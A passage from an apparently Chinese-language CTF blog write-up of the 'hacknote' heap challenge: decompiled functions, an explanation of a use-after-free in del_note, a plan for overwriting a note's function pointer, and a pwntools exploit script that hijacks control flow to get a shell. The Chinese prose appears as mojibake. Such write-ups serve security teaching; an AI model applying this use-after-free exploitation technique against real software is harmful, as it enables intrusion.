class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">add_note</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _DWORD *v0; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [esp+Ch] [ebp-1Ch]</span></span><br><span class="line">  <span class="keyword">int</span> size; <span class="comment">// [esp+10h] [ebp-18h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+14h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( count &lt;= <span class="number">5</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">4</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !notelist[i] )</span><br><span class="line">      &#123;</span><br><span class="line">        notelist[i] = <span class="built_in">malloc</span>(<span class="number">8u</span>);</span><br><span class="line">        <span class="keyword">if</span> ( !notelist[i] )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Alloca Error&quot;</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        *notelist[i] = print_note_content;      <span class="comment">// putå­—æ®µï¼Œ*notelist[i]ä¸ºå‡½æ•°æŒ‡é’ˆ</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Note size :&quot;</span>);</span><br><span class="line">        <span class="built_in">read</span>(<span class="number">0</span>, &amp;buf, <span class="number">8u</span>);</span><br><span class="line">        size = <span class="built_in">atoi</span>(&amp;buf);</span><br><span class="line">        v0 = notelist[i];</span><br><span class="line">        v0[<span class="number">1</span>] = <span class="built_in">malloc</span>(size);</span><br><span class="line">        <span class="keyword">if</span> ( !*(notelist[i] + <span class="number">1</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Alloca Error&quot;</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Content :&quot;</span>);</span><br><span class="line">        <span class="built_in">read</span>(<span class="number">0</span>, *(notelist[i] + <span class="number">1</span>), size);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Success !&quot;</span>);</span><br><span class="line">        ++count;</span><br><span class="line">        <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v5;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Full&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹        print_note:è°ƒç”¨äº†noteä¸­çš„å‡½æ•°æŒ‡é’ˆï¼Œå³print_content_function()å‡½æ•°</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">print_note</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+8h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index :&quot;</span>);</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, &amp;buf, <span class="number">4u</span>);</span><br><span class="line">  v1 = <span class="built_in">atoi</span>(&amp;buf);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt;= count )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Out of bound!&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( notelist[v1] )</span><br><span class="line">    (*notelist[v1])(notelist[v1]);              <span class="comment">// è°ƒç”¨notelist[v1]æ‰€æŒ‡å‡½æ•°</span></span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v3;             <span class="comment">// å› æ­¤åˆ©ç”¨æ€è·¯ä¸ºï¼šæ”¹å†™notelist[v1]ä¹‹æ‰€æŒ‡</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹        del_note:åœ¨æ­¤å‡½æ•°ä¸­å‘ç°ï¼Œå‡½æ•°ä»…å¯¹å †è¿›è¡Œfreeï¼Œä½†å¹¶æœªç½®ç©ºï¼Œå› æ­¤å­˜åœ¨UAFæ¼æ´ã€‚</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">del_note</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+8h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index :&quot;</span>);</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, &amp;buf, <span class="number">4u</span>);</span><br><span class="line">  v1 = <span class="built_in">atoi</span>(&amp;buf);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt;= count )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Out of bound!&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( notelist[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(*(notelist[v1] + <span class="number">1</span>));</span><br><span class="line">    <span class="built_in">free</span>(notelist[v1]);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Success&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹        è¿˜æœ‰è¦æ³¨æ„çš„æ˜¯ï¼Œå¯¹äºæ¯ä¸ªnoteï¼Œéƒ½æœ‰ä¸€ä¸ªnotelistå‡½æ•°æŒ‡é’ˆptrï¼ŒæŒ‡å‘print_note_content()ã€‚å¹¶åœ¨æ–°å»ºnoteçš„æ—¶å€™å°±ä¼šè¢«åˆå§‹åŒ–ä¸ºprint_note_content(),æ‰€ä»¥æ— æ³•å¯¹äºå•ä¸ªnoteçš„ptrè¿›è¡Œæ”¹å†™ã€‚</p><p>print_note_content:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">print_note_content</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(*(a1 + <span class="number">4</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹        ä¹Ÿå°±æ˜¯è¯´æ¯ä¸€ä¸ªnoteï¼Œéƒ½åŒ…å«äº†ä¸¤ä¸ªchunkï¼Œç¬¬ä¸€ä¸ªï¼ˆ8 bytesï¼‰å­˜çš„æ˜¯å‡½æ•°æŒ‡é’ˆptrï¼Œå¦ä¸€ä¸ªæ˜¯æŒ‡å‘å†…å®¹çš„æŒ‡é’ˆptr_contentã€‚ç¬¬äºŒä¸ªå­˜çš„æ˜¯ç”¨æˆ·è¾“å…¥çš„contentã€‚</p><h3 id="B-åˆ©ç”¨æ€è·¯"><a href="#B-åˆ©ç”¨æ€è·¯" class="headerlink" title="B.åˆ©ç”¨æ€è·¯"></a>B.åˆ©ç”¨æ€è·¯</h3><p>â€‹        1.èƒ½ç”±ç”¨æˆ·æ§åˆ¶çš„å†…å®¹åªæœ‰contentï¼Œæ‰€ä»¥åŸºæœ¬æ€è·¯å°±æ˜¯ç”¨ä¸€ä¸ªnote_açš„è¾“å…¥è¿‡ç¨‹ï¼Œå»æ”¹å†™note_bçš„å‡½æ•°æŒ‡é’ˆptrï¼Œå†print(note_b)</p><p>â€‹        2.è¦ä½¿å¾—note_bè¢«note_aæ”¹å†™ï¼Œé™¤éåè€…è¿›è¡Œå †æº¢å‡ºï¼Œæˆ–è€…ä¸¤è€…å†æŸä¸€æ—¶åˆ»åŒæ—¶æŒ‡å‘åŒä¸€å—å†…å­˜åŒºåŸŸã€‚å› æ­¤å¯ä»¥æƒ³åˆ°åˆ©ç”¨UAFæ¼æ´ï¼Œå…ˆfree(note_b)å†add(note_a)ï¼Œå°†payloadå†™å…¥åˆ°note_aä¸­ã€‚</p><p>â€‹        3.å¦‚æœæœ‰ä¸¤ä¸ªç›¸é‚»çš„noteï¼Œå››ä¸ªç›¸é‚»çš„chunkï¼Œç»“æ„å¦‚ä¸‹ï¼š</p><div align="center"><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/UAF-Hacknote/(3).png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/UAF-Hacknote/(3).png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="heap 1" style="zoom: 37%;" /> </div>- å¯¹äºå‡½æ•°æŒ‡é’ˆå’Œå†…å®¹æŒ‡é’ˆï¼Œå„å 4 Bytesï¼Œå†åŠ ä¸Šå…¶ä»–chunkæ•°æ®å¹¶éµå¾ªå †å†…å­˜å¯¹é½ï¼Œå¯çŸ¥chunk1å’Œchunk3åˆ†åˆ«ä¸º16 Bytesã€‚<ul><li><p>åˆ†åˆ«freeä¹‹åbiné“¾è¡¨å†…å®¹ä¸ºï¼š(head) chunk1 â€“&gt; chunk2 â€“&gt; chunk3 â€“&gt; chunk4 (tail)æ­¤æ—¶å†ç”³è¯·å‡ºnote2ï¼Œä½œä¸ºæ”¹å†™ç”¨çš„note_aã€‚</p></li><li><p>è€Œåœ¨mallocæ—¶ï¼Œå¦‚æœchunk2å’Œchunk4çš„å¤§å°(å³size of content)å¤§äº16 Bytesï¼Œä¸”note_aå¤§å°å°äº16 Bytesï¼Œç³»ç»Ÿå°±ä¼šä»biné“¾è¡¨å°¾éƒ¨å‘å¤´éƒ¨å¯»æ‰¾é€‚å½“å¤§å°çš„å·²é‡Šæ”¾chunkï¼Œè¿›è€Œå°†chunk3å’Œchunk1åˆ†é…ç»™note_aï¼Œè€Œchunk3å’Œchunk1ä¸­çš„ä¸¤ä¸ªæŒ‡é’ˆæ­£æ˜¯æˆ‘ä»¬è¦æ”¹å†™çš„åœ°æ–¹ã€‚</p></li><li><p>æ‰€ä»¥æˆ‘ä»¬çŸ¥é“ï¼Œéœ€è¦ç»™note0å’Œnote1çš„contentéƒ¨åˆ†åˆ†é…32bytesçš„å¤§å°ã€‚</p><div align="center"><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/UAF-Hacknote/(4).png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/UAF-Hacknote/(4).png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="heap 2" style="zoom:37%;" /></div>â€‹    4.å†…å­˜åˆ†é…æƒ…å†µå†³å®šä¹‹åï¼Œåªéœ€è¦å°†note0è§†ä½œnote_bï¼Œåœ¨note_aä¸­å†™å…¥payloadï¼ˆnote_açš„contentéƒ¨åˆ†ä¸note_bçš„contentéƒ¨åˆ†ä¸ºåŒä¸€å†…å­˜å—ï¼‰ï¼Œå³å¯æ”¹å†™note_bçš„å‡½æ•°æŒ‡é’ˆã€‚è°ƒç”¨å‡½æ•°print(note_b)å³å¯getshellã€‚</li></ul><h3 id="C-exp"><a href="#C-exp" class="headerlink" title="C.exp:"></a>C.exp:</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = process(<span class="string">&#x27;./hacknote&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">addnote</span>(<span class="params">size, content</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delnote</span>(<span class="params">idx</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printnote</span>(<span class="params">idx</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">magic = <span class="number">0x08048986</span></span><br><span class="line"></span><br><span class="line">addnote(<span class="number">32</span>, <span class="string">&quot;aaaa&quot;</span>) <span class="comment"># add note 0</span></span><br><span class="line">addnote(<span class="number">32</span>, <span class="string">&quot;ddaa&quot;</span>) <span class="comment"># add note 1</span></span><br><span class="line"></span><br><span class="line">delnote(<span class="number">0</span>) <span class="comment"># delete note 0</span></span><br><span class="line">delnote(<span class="number">1</span>) <span class="comment"># delete note 1</span></span><br><span class="line"></span><br><span class="line">addnote(<span class="number">8</span>, p32(magic)) <span class="comment"># add note 2</span></span><br><span class="line"></span><br><span class="line">printnote(<span class="number">0</span>) <span class="comment"># print note 0</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
